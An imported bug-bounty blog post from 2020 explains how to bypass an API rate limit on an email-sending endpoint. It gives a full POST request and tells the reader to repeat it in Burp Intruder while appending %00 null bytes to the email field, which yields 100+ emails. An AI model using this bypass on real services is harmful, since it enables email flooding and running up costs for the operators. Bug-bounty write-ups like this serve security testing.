---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-04-14_bounty-tip-easiest-way-to-bypass-apis-rate-limit.md
original_filename: 2020-04-14_bounty-tip-easiest-way-to-bypass-apis-rate-limit.md
title: Bounty Tip !! Easiest way to bypass API’s Rate Limit.
category: documents
detected_topics:
- rate-limit
- api-security
- command-injection
- otp
tags:
- imported
- documents
- rate-limit
- api-security
- command-injection
- otp
language: en
raw_sha256: 9fffb318f3fa409cd8a68f4b08e2676b6da9650ddd231484526fdee853342966
text_sha256: 9991b9dee7346ae94aeba1b803951fe9681eff0347b9c7f341634cb12977e854
ingested_at: '2026-06-28T07:32:01Z'
sensitivity: unknown
redactions_applied: false
---

# Bounty Tip !! Easiest way to bypass API’s Rate Limit.

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-04-14_bounty-tip-easiest-way-to-bypass-apis-rate-limit.md
- Source Type: markdown
- Detected Topics: rate-limit, api-security, command-injection, otp
- Ingested At: 2026-06-28T07:32:01Z
- Redactions Applied: False
- Raw SHA256: `9fffb318f3fa409cd8a68f4b08e2676b6da9650ddd231484526fdee853342966`
- Text SHA256: `9991b9dee7346ae94aeba1b803951fe9681eff0347b9c7f341634cb12977e854`


## Content

---
title: "Bounty Tip !! Easiest way to bypass API’s Rate Limit."
url: "https://medium.com/bugbountywriteup/bounty-tip-easiest-way-to-bypass-apis-rate-limit-f984fad40093"
authors: ["Shaurya Sharma (@ShauryaSharma05)"]
bugs: ["Rate limiting bypass"]
publication_date: "2020-04-14"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4656
scraped_via: "browseros"
---

# Bounty Tip !! Easiest way to bypass API’s Rate Limit.

Bounty Tip !! Easiest way to bypass API’s Rate Limit.
Shaurya Sharma
Follow
2 min read
·
Apr 15, 2020

305

3

What is Rate Limit ?

Rate limiting is used to control the amount of incoming and outgoing traffic from a network. If you are using a particular API that is configured to allow 100 requests/minute. If the number of requests you make exceeds that limit, then an error will be triggered

Press enter or click to view image in full size

I was recently invited for a private program, where the web application was working on REST API and I noticed that whenever a user hit’s /users_log_in endpoints too many times it reflects the output -: “TOO MANY REQUESTS”

HTTP/1.1 429 Too Many Requests
Date: Mon, 10 March 2020 05:35:28 GMT
Content-Type: text/plain
Send the following POST request:-

POST /secret HTTP/1.1
Host: www.Example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 179
Origin: https://www.Example.com
Connection: close
Referer: https://www.Example.com/secret/new

Token: **Token**&utf8=%E2%9C%93&user%5email%5D=YOUR_EMAIL@example.com&commit=Send

Now Send This Request To Intruder And Repeat It 100 Time By Fixing Any Arbitrary Payload-:

Language: en-US,en;q=0.$5$

&user%5email%5D=YOUR_EMAIL@example.com%00 — and keep adding %00 every time you exhaust your RATE LIMIT.

See You Will Get 200 OK Status Code & 100 + Email In Your INBOX

Get Shaurya Sharma’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

IMPACT -: No real impact but if you are using any Email Service API or some tool which costs you for your Email this type of attack can results in financial loss and it can also slow down your mailing services

#HappyHacking #BugBountyTips
